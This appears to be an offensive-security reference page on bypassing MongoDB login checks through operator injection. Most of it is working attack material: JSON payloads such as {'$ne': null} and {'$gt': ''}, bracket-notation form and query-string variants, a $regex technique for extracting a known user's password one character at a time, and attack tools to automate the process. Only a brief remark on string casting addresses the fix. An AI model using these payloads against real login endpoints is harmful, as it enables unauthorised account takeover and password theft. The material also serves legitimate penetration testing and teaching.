---
title: "Authentication bypass via MongoDB operator injection"
description: "Replacing a password string with an operator object such as {\"$ne\":null} turns a login lookup into an always-true filter, logging in without credentials."
keywords:
  - MongoDB authentication bypass
  - NoSQL login bypass
  - $ne operator
  - operator injection
  - password brute force
  - $regex
---

# Authentication bypass

The canonical MongoDB attack turns a login query into an always-true filter by sending a query **operator** where the application expects a password string. It works whenever the handler builds the filter from request fields without coercing them to strings.

## Vulnerable pattern

```javascript
// fields taken straight from the parsed request body
const user = await db.collection("users").findOne({
  username: req.body.username,
  password: req.body.password
});
if (user) { /* authenticated */ }
```

If `req.body.password` is a string, the filter compares for equality. If it is an **object**, that object is interpreted as an operator and the equality check is gone.

## The canonical payload

Send JSON where the password is an operator that matches any stored value:

```json
{"username": "admin", "password": {"$ne": null}}
```

`$ne` means "not equal", so `password != null` is true for every user that has a password. The query returns the `admin` document and the session is established without knowing the password. `$gt` against an empty string is equivalent and often slips past naive filters that look only for `$ne`:

```json
{"username": "admin", "password": {"$gt": ""}}
```

When the username is also unknown, make both fields match anything and take the first document the driver returns:

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Framework parsing turns strings into operators

The attack is not limited to JSON bodies. Query-string and URL-encoded form parsers that support nested keys (Express with `qs`/`body-parser`, PHP's native parsing) build an object from bracket notation. A login form posted as `application/x-www-form-urlencoded` with these fields:

```
username=admin&password[$ne]=null
```

is parsed into `{ username: "admin", password: { $ne: "null" } }`, so `password` arrives as an operator object exactly as the JSON form would. The same works in a GET query string:

```
/login?username=admin&password[$ne]=
```

PHP's parser produces the identical structure from `password[$ne]=1`, which is how the classic `$where`/`$ne` bypasses were delivered against PHP MongoDB apps. The precondition is unchanged: the value must reach the filter as the parsed object, not after a cast such as `(string)$_POST['password']` or `String(req.body.password)`.

## $regex to confirm and brute a known-user password

Once a username is known, `$regex` turns the login endpoint into an oracle for the password itself. A regex that matches anything confirms the account exists and the field is injectable:

```json
{"username": "admin", "password": {"$regex": ".*"}}
```

Anchor the pattern to recover the password character by character. A successful login (or any observable difference, redirect, set-cookie, response length) means the prefix matched:

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
```

Walk the alphabet at each position, keep the character that authenticates, and extend the anchor until the full value is recovered. In form-encoded form:

```
username=admin&password[$regex]=^adm
```

Escape regex metacharacters in candidate characters (`.`, `*`, `+`, `$`, `\`) so they match literally. This recovers passwords stored in cleartext or reversible form; against a hashed field the regex matches the hash string, which is still useful where the hash is predictable or where the field holds a token.

## Tools

- **NoSQLMap**: automate operator-injection login bypass against the endpoint.
- **nosqli**: scan the login parameters for injectable operator objects.
- **Burp Repeater**: send $ne, $gt, or $regex payloads as JSON or bracketed form fields.

## References

- [MongoDB: Query comparison operators](https://www.mongodb.com/docs/manual/reference/operator/query-comparison/)
- [MongoDB: $regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
